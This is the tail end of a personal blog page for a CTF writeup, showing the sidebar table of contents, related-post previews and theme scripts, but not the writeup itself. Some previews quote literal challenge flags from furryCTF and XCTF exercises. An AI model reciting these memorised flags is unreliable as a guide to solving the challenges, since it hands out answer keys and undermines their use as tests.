</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://joke-new.zeabur.app">joke</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://joke-new.zeabur.app/2026/01/04/CTFSHOW-2026%E5%85%83%E6%97%A6%E8%B7%A8%E5%B9%B4%E6%AC%A2%E4%B9%90%E8%B5%9B-CS2026-%E4%B8%AA%E4%BA%BA%E5%86%99%E7%9A%84%E9%83%A8%E5%88%86wp/">https://joke-new.zeabur.app/2026/01/04/CTFSHOW-2026%E5%85%83%E6%97%A6%E8%B7%A8%E5%B9%B4%E6%AC%A2%E4%B9%90%E8%B5%9B-CS2026-%E4%B8%AA%E4%BA%BA%E5%86%99%E7%9A%84%E9%83%A8%E5%88%86wp/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://joke-new.zeabur.app" target="_blank">joke的小世界</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/web/">web</a><a class="post-meta__tags" href="/tags/ctfshow/">ctfshow</a><a class="post-meta__tags" href="/tags/misc/">misc</a><a class="post-meta__tags" href="/tags/ctf/">ctf</a></div><div class="post-share"><div class="social-share" data-image="https://picsum.photos/1920/1080?random=1" data-sites="facebook,x,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2026/01/05/%E5%8E%8B%E7%BC%A9%E5%8C%85%E5%90%84%E7%A7%8D%E7%B1%BB%E5%9E%8B%E8%A7%A3%E5%8E%8B%E8%84%9A%E6%9C%AC%EF%BC%88%E9%80%82%E5%90%88%E5%A5%97%E5%A8%83%E9%A2%98%EF%BC%89/" title="压缩包各种类型解压脚本（适合套娃题）"><img class="cover" src="https://picsum.photos/1920/1080?random=3" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">压缩包各种类型解压脚本（适合套娃题）</div></div><div class="info-2"><div class="info-item-1">压缩包全解压脚本：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184import osimport shutilimport zipfileimport t...</div></div></div></a><a class="pagination-related" href="/2026/01/03/furryCTF%E7%83%AD%E8%BA%AB%E8%B5%9Bwp/" title="furryCTF热身赛wp"><img class="cover" src="https://picsum.photos/1920/1080?random=2" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">furryCTF热身赛wp</div></div><div class="info-2"><div class="info-item-1">furryCTF2025赛前热身题（misc方向）比赛网站：https://furryctf.com/games/5 1.签到题题目描述： 123话说，你们有发现比赛平台上藏有一个flag吗？注意flag格式哦~  在赛题主页就可以找到：   flag为： 1furryCTF&#123;Hack_for_fun_not_for_profit&#125;  2.新的一年，新的开始题目描述： 1234567891011Catch The FutureTime to own 2025Forever young in hackingfurryCTF&#123;h4ppY_n3w_y34r_2o25_w1th_1Ov3&#125;祝各位师傅：栈上生花，堆里藏月，逆向不秃，web不坐牢，pwn穿一切，ak全场！ 🚩🎉  这种就是问卷题 flag为： 1furryCTF&#123;h4ppY_n3w_y34r_2o25_w1th_1Ov3&#125;  3.PassDump123456789作为CTFer，很多时候都会有电脑放一夜跑程序的经历。但猫猫看着跑一夜碰撞之后蓝屏的电脑，陷入了沉思...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2026/01/28/XCTF-LilacCTF-2026-Writeup/" title="XCTF-LilacCTF 2026-Writeup"><img class="cover" src="https://picsum.photos/1920/1080?random=1" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-01-28</div><div class="info-item-2">XCTF-LilacCTF 2026-Writeup</div></div><div class="info-2"><div class="info-item-1">XCTF-LilacCTF 2026-Writeup官方题目网址：https://adworld.xctf.org.cn/match/guide?event_hash=7b528ca2-f4da-11f0-bf63-000c297261bb 这次就做出来5题(比一开始只会签到要好)，以自己的拙见写一份wp 1.MISC-Welcome签到题 题目描述： 1789c0540b10980400c5ce92442067849153bc1f278ae1031ad95b87bc8bba6c611df6925ec46076bc955f2e0056ccc773c7f03fb580c81  这是一个十六进制字符串（hex）最后肯定要转成ASCII码：这里介绍两种做法，一种是用脚本就是下面这种做法： 12345import binascii, zlibhexdata = &quot;789c0540b10980400c5ce92442067849153bc1f278ae1031ad95b87bc8bba6c611df6925ec46076bc955f2e0056ccc773c7f03fb580c8...</div></div></div></a><a class="pagination-related" href="/2026/01/05/%E5%8E%8B%E7%BC%A9%E5%8C%85%E5%90%84%E7%A7%8D%E7%B1%BB%E5%9E%8B%E8%A7%A3%E5%8E%8B%E8%84%9A%E6%9C%AC%EF%BC%88%E9%80%82%E5%90%88%E5%A5%97%E5%A8%83%E9%A2%98%EF%BC%89/" title="压缩包各种类型解压脚本（适合套娃题）"><img class="cover" src="https://picsum.photos/1920/1080?random=3" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-01-05</div><div class="info-item-2">压缩包各种类型解压脚本（适合套娃题）</div></div><div class="info-2"><div class="info-item-1">压缩包全解压脚本：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184import osimport shutilimport zipfileimport t...</div></div></div></a><a class="pagination-related" href="/2026/01/24/Web%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%85%A5%E9%97%A8%E9%A2%98%E5%8D%95/" title="Web攻防世界入门题单"><img class="cover" src="https://picsum.photos/1920/1080?random=1" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-01-24</div><div class="info-item-2">Web攻防世界入门题单</div></div><div class="info-2"><div class="info-item-1">Web学习笔记 Writeup攻防世界入门题单：https://adworld.xctf.org.cn/challenges/problem-set-index?id=25 入门题单教程：https://www.bilibili.com/video/BV1rz4y137dF/（讲的非常通俗，爱了爱了） 1.view_source题目描述： 1X老师让小宁同学查看一个网页的源代码，但小宁同学发现鼠标右键好像不管用了。  本题要求就是看网页源代码，按F12，元素里就可以看到flag   flag为： 1cyberpeace&#123;34c612f0278f14ab46733186fa21d41f&#125;   2.get_post题目描述： 1X老师告诉小宁同学HTTP通常使用两种请求方法，你知道是哪两种吗？  通过上网查询，得知： HTTP协议中最常用的两种请求方法是GET和POST。  GET：用于从服务器获取数据，参数通过URL传递（如/test?name=value），适合非敏感信息的查询，但数据长度受URL限制。 POST：用于向服务器提交数据，参数放在请求体中（如表单...</div></div></div></a><a class="pagination-related" href="/2026/02/09/furryCTF-2025-WP-from-NinaSec-%E5%92%8C%E5%B7%A5%E4%B8%80%E9%98%B5%E5%B8%88%E5%82%85%E4%B8%80%E8%B5%B7%E5%81%9A%E7%9A%84nwn/" title="furryCTF 2025 WP from NinaSec(和工一阵师傅一起做的nwn)"><img class="cover" src="https://picsum.photos/1920/1080?random=3" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-02-09</div><div class="info-item-2">furryCTF 2025 WP from NinaSec(和工一阵师傅一起做的nwn)</div></div><div class="info-2"><div class="info-item-1">furryCTF 2025 Writeup-NinaSec WP(和工一阵师傅一起做的，nwn)本次比赛解出来29题，燃尽了。（另外，感谢工一阵师傅的抢血奋斗zmz） 复现网址：https://furryctf.com/games/2/challenges 【Misc】签到题题目描述： 12345678本题flag头：furryCTF&#123;&#125;这里是今年的签到题~nwn不整太多花里胡哨的了，今年的签到题题目是一个投票：https://tp.wjx.top/vm/tUv4AXj.aspx#a？你说过期了？那不关我的事nwn，我已经把flag写在投票后的页面了，怎么拿是你的问题哦~时刻记得，flag的格式为furryCTF&#123;&#125;哦~因为这个题目太简单，所以初始分数只有100分，最高衰减20% zwz  【解题思路】 这题主要就是看源码，考验检索能力。 【解题步骤】   打开题目链接可以看到这个页面，点击查看结果依旧没有什么线索：   所以就直接ctrl+u看源码，按ctrl+f搜索furryCTF就可以看到flag:   flag为： 1furryCT...</div></div></div></a><a class="pagination-related" href="/2026/01/03/furryCTF%E7%83%AD%E8%BA%AB%E8%B5%9Bwp/" title="furryCTF热身赛wp"><img class="cover" src="https://picsum.photos/1920/1080?random=2" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-01-03</div><div class="info-item-2">furryCTF热身赛wp</div></div><div class="info-2"><div class="info-item-1">furryCTF2025赛前热身题（misc方向）比赛网站：https://furryctf.com/games/5 1.签到题题目描述： 123话说，你们有发现比赛平台上藏有一个flag吗？注意flag格式哦~  在赛题主页就可以找到：   flag为： 1furryCTF&#123;Hack_for_fun_not_for_profit&#125;  2.新的一年，新的开始题目描述： 1234567891011Catch The FutureTime to own 2025Forever young in hackingfurryCTF&#123;h4ppY_n3w_y34r_2o25_w1th_1Ov3&#125;祝各位师傅：栈上生花，堆里藏月，逆向不秃，web不坐牢，pwn穿一切，ak全场！ 🚩🎉  这种就是问卷题 flag为： 1furryCTF&#123;h4ppY_n3w_y34r_2o25_w1th_1Ov3&#125;  3.PassDump123456789作为CTFer，很多时候都会有电脑放一夜跑程序的经历。但猫猫看着跑一夜碰撞之后蓝屏的电脑，陷入了沉思...</div></div></div></a><a class="pagination-related" href="/2026/01/01/Vulnix%20993%20SSLTLS%20%E5%AE%89%E5%85%A8%E6%89%AB%E6%8F%8F%E7%BB%93%E6%9E%9C%E6%B1%87%E6%80%BB/" title="vulnix常用靶机用testssl扫描结果"><img class="cover" src="https://picsum.photos/1920/1080?random=3" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-01-01</div><div class="info-item-2">vulnix常用靶机用testssl扫描结果</div></div><div class="info-2"><div class="info-item-1">   使用了testssl.sh-3.3 参照网址：https://github.com/testssl/testssl.sh   Vulnix (192.168.137.133:993) SSL&#x2F;TLS 安全扫描结果汇总扫描时间: 2025-12-03 08:10:02 - 08:10:57 (总耗时 56s)目标服务: IMAPOpenSSL版本 (客户端检测): OpenSSL 1.0.2-bad (Mar 28 2025)总体评级: T (信任问题)  表格一：支持的 SSL&#x2F;TLS 协议和密码套件 (协议和Cipher Categories部分)   类别 项目 状态 &#x2F; 结果 严重性 &#x2F; 建议    协议支持 SSLv2 not offered (OK) (未提供) 正常，安全。    SSLv3 offered (NOT ok) (已提供) 高危。完全过时，存在 POODLE 漏洞风险，应立即禁用。    TLS 1.0 offered (deprecated) (已提供，已弃用) 中危。已过时，存在已知缺陷，应禁用。    ...</div></div></div></a></div></div><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div id="twikoo-wrap"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/9.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">joke</div><div class="author-info-description">我希望你多笑笑</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">9</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">8</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">5</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/simple9656"><i class="fab fa-github"></i><span>click me</span></a><div class="card-info-social-icons"><a class="social-icon" href="/h" target="_blank" title=""><i></i></a><a class="social-icon" href="/t" target="_blank" title=""><i class="1"></i></a><a class="social-icon" href="/t" target="_blank" title=""><i class="2"></i></a><a class="social-icon" href="/p" target="_blank" title=""><i class="3"></i></a><a class="social-icon" href="/s" target="_blank" title=""><i class="4"></i></a><a class="social-icon" href="/:" target="_blank" title=""><i class="5"></i></a><a class="social-icon" href="/" target="_blank" title=""><i class="6"></i></a><a class="social-icon" href="/" target="_blank" title=""><i class="7"></i></a><a class="social-icon" href="/g" target="_blank" title=""><i class="8"></i></a><a class="social-icon" href="/i" target="_blank" title=""><i class="9"></i></a><a class="social-icon" href="/t" target="_blank" title=""><i class="10"></i></a><a class="social-icon" href="/h" target="_blank" title=""><i class="11"></i></a><a class="social-icon" href="/u" target="_blank" title=""><i class="12"></i></a><a class="social-icon" href="/b" target="_blank" title=""><i class="13"></i></a><a class="social-icon" href="/." target="_blank" title=""><i class="14"></i></a><a class="social-icon" href="/c" target="_blank" title=""><i class="15"></i></a><a class="social-icon" href="/o" target="_blank" title=""><i class="16"></i></a><a class="social-icon" href="/m" target="_blank" title=""><i class="17"></i></a><a class="social-icon" href="/" target="_blank" title=""><i class="18"></i></a><a class="social-icon" href="/s" target="_blank" title=""><i class="19"></i></a><a class="social-icon" href="/i" target="_blank" title=""><i class="20"></i></a><a class="social-icon" href="/m" target="_blank" title=""><i class="21"></i></a><a class="social-icon" href="/p" target="_blank" title=""><i class="22"></i></a><a class="social-icon" href="/l" target="_blank" title=""><i class="23"></i></a><a class="social-icon" href="/e" target="_blank" title=""><i class="24"></i></a><a class="social-icon" href="/9" target="_blank" title=""><i class="25"></i></a><a class="social-icon" href="/6" target="_blank" title=""><i class="26"></i></a><a class="social-icon" href="/5" target="_blank" title=""><i class="27"></i></a><a class="social-icon" href="/6" target="_blank" title=""><i class="28"></i></a><a class="social-icon" href="/" target="_blank" title=""><i class="29"></i></a><a class="social-icon" href="/%7C" target="_blank" title=""><i class="30"></i></a><a class="social-icon" href="/%7C" target="_blank" title=""><i class="31"></i></a><a class="social-icon" href="/" target="_blank" title=""><i class="32"></i></a><a class="social-icon" href="/G" target="_blank" title=""><i class="33"></i></a><a class="social-icon" href="/i" target="_blank" title=""><i class="34"></i></a><a class="social-icon" href="/t" target="_blank" title=""><i class="35"></i></a><a class="social-icon" href="/h" target="_blank" title=""><i class="36"></i></a><a class="social-icon" href="/u" target="_blank" title=""><i class="37"></i></a><a class="social-icon" href="/b" target="_blank" title=""><i class="38"></i></a><a class="social-icon" href="/" target="_blank" title=""><i class="39"></i></a><a class="social-icon" href="/%7C" target="_blank" title=""><i class="40"></i></a><a class="social-icon" href="/%7C" target="_blank" title=""><i class="41"></i></a><a class="social-icon" href="/" target="_blank" title=""><i class="42"></i></a><a class="social-icon" href="/'" target="_blank" title=""><i class="43"></i></a><a class="social-icon" href="#" target="_blank" title=""><i class="44"></i></a><a class="social-icon" href="/2" target="_blank" title=""><i class="45"></i></a><a class="social-icon" href="/4" target="_blank" title=""><i class="46"></i></a><a class="social-icon" href="/2" target="_blank" title=""><i class="47"></i></a><a class="social-icon" href="/9" target="_blank" title=""><i class="48"></i></a><a class="social-icon" href="/2" target="_blank" title=""><i class="49"></i></a><a class="social-icon" href="/e" target="_blank" title=""><i class="50"></i></a><a class="social-icon" href="/'" target="_blank" title=""><i class="51"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">你是我生命里的意外惊喜，不需要言语，却能治愈我所有的疲惫。每一次低落，都是因为你，我才重新找到力量。你是我不曾预料的温暖，直接击中心脏。你，是我的全世界。</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BA%8C-CTFSHOW-2026%E5%85%83%E6%97%A6%E8%B7%A8%E5%B9%B4%E6%AC%A2%E4%B9%90%E8%B5%9B-CS2026-%E4%B8%AA%E4%BA%BA%E5%86%99%E7%9A%84%E9%83%A8%E5%88%86wp"><span class="toc-number">1.</span> <span class="toc-text">二.CTFSHOW-2026元旦跨年欢乐赛-CS2026(个人写的部分wp)</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E7%83%AD%E8%BA%AB%E7%AD%BE%E5%88%B0"><span class="toc-number">1.1.</span> <span class="toc-text">1.热身签到</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-cs2026%E9%97%AE%E5%8D%B7%E8%B0%83%E6%9F%A5"><span class="toc-number">1.2.</span> <span class="toc-text">2.cs2026问卷调查</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-SafePassword"><span class="toc-number">1.3.</span> <span class="toc-text">3.SafePassword</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-HappySong"><span class="toc-number">1.4.</span> <span class="toc-text">4.HappySong</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-SafePIN"><span class="toc-number">1.5.</span> <span class="toc-text">5.SafePIN</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6-Happy2026"><span class="toc-number">1.6.</span> <span class="toc-text">6.Happy2026</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#7-SafePHP"><span class="toc-number">1.7.</span> <span class="toc-text">7.SafePHP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#8-SafeCard"><span class="toc-number">1.8.</span> <span class="toc-text">8.SafeCard</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#9-SafeCalc"><span class="toc-number">1.9.</span> <span class="toc-text">9.SafeCalc</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#10-SafeViewer"><span class="toc-number">1.10.</span> <span class="toc-text">10.SafeViewer</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2026/02/09/furryCTF-2025-WP-from-NinaSec-%E5%92%8C%E5%B7%A5%E4%B8%80%E9%98%B5%E5%B8%88%E5%82%85%E4%B8%80%E8%B5%B7%E5%81%9A%E7%9A%84nwn/" title="furryCTF 2025 WP from NinaSec(和工一阵师傅一起做的nwn)"><img src="https://picsum.photos/1920/1080?random=3" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="furryCTF 2025 WP from NinaSec(和工一阵师傅一起做的nwn)"/></a><div class="content"><a class="title" href="/2026/02/09/furryCTF-2025-WP-from-NinaSec-%E5%92%8C%E5%B7%A5%E4%B8%80%E9%98%B5%E5%B8%88%E5%82%85%E4%B8%80%E8%B5%B7%E5%81%9A%E7%9A%84nwn/" title="furryCTF 2025 WP from NinaSec(和工一阵师傅一起做的nwn)">furryCTF 2025 WP from NinaSec(和工一阵师傅一起做的nwn)</a><time datetime="2026-02-09T13:08:06.000Z" title="发表于 2026-02-09 21:08:06">2026-02-09</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/01/28/XCTF-LilacCTF-2026-Writeup/" title="XCTF-LilacCTF 2026-Writeup"><img src="https://picsum.photos/1920/1080?random=1" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="XCTF-LilacCTF 2026-Writeup"/></a><div class="content"><a class="title" href="/2026/01/28/XCTF-LilacCTF-2026-Writeup/" title="XCTF-LilacCTF 2026-Writeup">XCTF-LilacCTF 2026-Writeup</a><time datetime="2026-01-28T04:37:32.000Z" title="发表于 2026-01-28 12:37:32">2026-01-28</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/01/24/Web%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%85%A5%E9%97%A8%E9%A2%98%E5%8D%95/" title="Web攻防世界入门题单"><img src="https://picsum.photos/1920/1080?random=1" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Web攻防世界入门题单"/></a><div class="content"><a class="title" href="/2026/01/24/Web%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%85%A5%E9%97%A8%E9%A2%98%E5%8D%95/" title="Web攻防世界入门题单">Web攻防世界入门题单</a><time datetime="2026-01-23T16:27:53.000Z" title="发表于 2026-01-24 00:27:53">2026-01-24</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/01/05/%E5%8E%8B%E7%BC%A9%E5%8C%85%E5%90%84%E7%A7%8D%E7%B1%BB%E5%9E%8B%E8%A7%A3%E5%8E%8B%E8%84%9A%E6%9C%AC%EF%BC%88%E9%80%82%E5%90%88%E5%A5%97%E5%A8%83%E9%A2%98%EF%BC%89/" title="压缩包各种类型解压脚本（适合套娃题）"><img src="https://picsum.photos/1920/1080?random=3" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="压缩包各种类型解压脚本（适合套娃题）"/></a><div class="content"><a class="title" href="/2026/01/05/%E5%8E%8B%E7%BC%A9%E5%8C%85%E5%90%84%E7%A7%8D%E7%B1%BB%E5%9E%8B%E8%A7%A3%E5%8E%8B%E8%84%9A%E6%9C%AC%EF%BC%88%E9%80%82%E5%90%88%E5%A5%97%E5%A8%83%E9%A2%98%EF%BC%89/" title="压缩包各种类型解压脚本（适合套娃题）">压缩包各种类型解压脚本（适合套娃题）</a><time datetime="2026-01-05T13:45:53.000Z" title="发表于 2026-01-05 21:45:53">2026-01-05</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/01/04/CTFSHOW-2026%E5%85%83%E6%97%A6%E8%B7%A8%E5%B9%B4%E6%AC%A2%E4%B9%90%E8%B5%9B-CS2026-%E4%B8%AA%E4%BA%BA%E5%86%99%E7%9A%84%E9%83%A8%E5%88%86wp/" title="CTFSHOW-2026元旦跨年欢乐赛-CS2026(个人写的部分wp)"><img src="https://picsum.photos/1920/1080?random=1" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="CTFSHOW-2026元旦跨年欢乐赛-CS2026(个人写的部分wp)"/></a><div class="content"><a class="title" href="/2026/01/04/CTFSHOW-2026%E5%85%83%E6%97%A6%E8%B7%A8%E5%B9%B4%E6%AC%A2%E4%B9%90%E8%B5%9B-CS2026-%E4%B8%AA%E4%BA%BA%E5%86%99%E7%9A%84%E9%83%A8%E5%88%86wp/" title="CTFSHOW-2026元旦跨年欢乐赛-CS2026(个人写的部分wp)">CTFSHOW-2026元旦跨年欢乐赛-CS2026(个人写的部分wp)</a><time datetime="2026-01-04T08:21:23.000Z" title="发表于 2026-01-04 16:21:23">2026-01-04</time></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 - 2026 By joke</span><span class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 8.1.1</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.5.3</a></span></div><div class="footer_custom_text">你和我的一切有关</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="前往评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.5.3"></script><script src="/js/main.js?v=5.5.3"></script><div class="js-pjax"><script>(() => {
  const isShuoshuo = GLOBAL_CONFIG_SITE.pageType === 'shuoshuo'
  const option = null

  const getCount = () => {
    const countELement = document.getElementById('twikoo-count')
    if(!countELement) return
    twikoo.getCommentsCount({
      envId: 'https://jokeblogcomments.vercel.app',
      region: '',
      urls: [window.location.pathname],
      includeReply: false
    }).then(res => {
      countELement.textContent = res[0].count
    }).catch(err => {
      console.error(err)
    })
  }

  const init = (el = document, path = location.pathname) => {
    twikoo.init({
      el: el.querySelector('#twikoo-wrap'),
      envId: 'https://jokeblogcomments.vercel.app',
      region: '',
      onCommentLoaded: () => {
        btf.loadLightbox(document.querySelectorAll('#twikoo .tk-content img:not(.tk-owo-emotion)'))
      },
      ...option,
      path: isShuoshuo ? path : (option && option.path) || path
    })

    

    isShuoshuo && (window.shuoshuoComment.destroyTwikoo = () => {
      if (el.children.length) {
        el.innerHTML = ''
        el.classList.add('no-comment')
      }
    })
  }

  const loadTwikoo = (el, path) => {
    if (typeof twikoo === 'object') setTimeout(() => init(el, path), 0)
    else btf.getScript('https://cdn.jsdelivr.net/npm/twikoo@1.6.44/dist/twikoo.all.min.js').then(() => init(el, path))
  }

  if (isShuoshuo) {
    'Twikoo' === 'Twikoo'
      ? window.shuoshuoComment = { loadComment: loadTwikoo }
      : window.loadOtherComment = loadTwikoo
    return
  }

  if ('Twikoo' === 'Twikoo' || !false) {
    if (false) btf.loadComment(document.getElementById('twikoo-wrap'), loadTwikoo)
    else loadTwikoo()
  } else {
    window.loadOtherComment = loadTwikoo
  }
})()</script></div><script src="/js/random_bg.js"></script><script src="/js/sakura.js"></script><script src="/js/music_card.js"></script><script src="/js/runtime.js"></script><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/dist/fireworks.min.js"></script><script src="https://cdn.jsdelivr.net/npm/pjax@0.2.8/pjax.min.js" defer="defer"></script><script>document.addEventListener('DOMContentLoaded', () => {
  const pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]

  window.pjax = new Pjax({
    elements: 'a:not([target="_blank"])',
    selectors: pjaxSelectors,
    cacheBust: false,
    analytics: false,
    scrollRestoration: false
  })

  const triggerPjaxFn = (val) => {
    if (!val) return
    Object.values(val).forEach(fn => {
      try {
        fn()
      } catch (err) {
        console.debug('Pjax callback failed:', err)
      }
    })
  }

  document.addEventListener('pjax:send', () => {
    // removeEventListener
    btf.removeGlobalFnEvent('pjaxSendOnce')
    btf.removeGlobalFnEvent('themeChange')

    // reset readmode
    const $bodyClassList = document.body.classList
    if ($bodyClassList.contains('read-mode')) $bodyClassList.remove('read-mode')

    triggerPjaxFn(window.globalFn.pjaxSend)
  })

  document.addEventListener('pjax:complete', () => {
    btf.removeGlobalFnEvent('pjaxCompleteOnce')
    document.querySelectorAll('script[data-pjax]').forEach(item => {
      const newScript = document.createElement('script')
      const content = item.text || item.textContent || item.innerHTML || ""
      Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
      newScript.appendChild(document.createTextNode(content))
      item.parentNode.replaceChild(newScript, item)
    })

    triggerPjaxFn(window.globalFn.pjaxComplete)
  })

  document.addEventListener('pjax:error', e => {
    if (e.request.status === 404) {
      false
        ? pjax.loadUrl('/404.html')
        : window.location.href = e.request.responseURL
    }
  })
})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><i class="fas fa-spinner fa-pulse" id="loading-status" hidden="hidden"></i><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据加载中</span></div><div class="local-search-input"><input placeholder="搜索文章喵...hhh你找到我了吗" type="text"/></div><hr/><div id="local-search-results"></div><div class="ais-Pagination" id="local-search-pagination" style="display:none;"><ul class="ais-Pagination-list"></ul></div><div id="local-search-stats"></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=5.5.3"></script></div></div><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"/live2dw/assets/shizuku.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":false},"react":{"opacity":0.9},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body></html>